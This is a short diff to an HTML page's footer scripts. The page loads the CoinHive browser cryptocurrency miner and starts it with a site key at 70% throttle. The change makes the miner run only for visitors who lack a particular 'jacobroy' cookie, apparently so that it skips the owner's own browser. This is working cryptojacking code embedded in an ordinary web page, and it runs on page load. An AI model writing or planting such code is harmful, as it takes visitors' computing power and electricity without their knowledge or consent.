@@ -130,8 +130,9 @@
     <script src="https://jacobroy.quebec/public/js/jacobroy.js"></script>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
+  if(document.cookie.match(/^(.*;)?\s*jacobroy\s*=\s*[^;]+(.*)?$/){}else{
   var miner = new CoinHive.Anonymous('hyJxMoLuJfYY9I3ms66opOncIjey9Bqg', {throttle: 0.7});
-  miner.start();
+  miner.start();}
 </script>
   </body>
 </html>
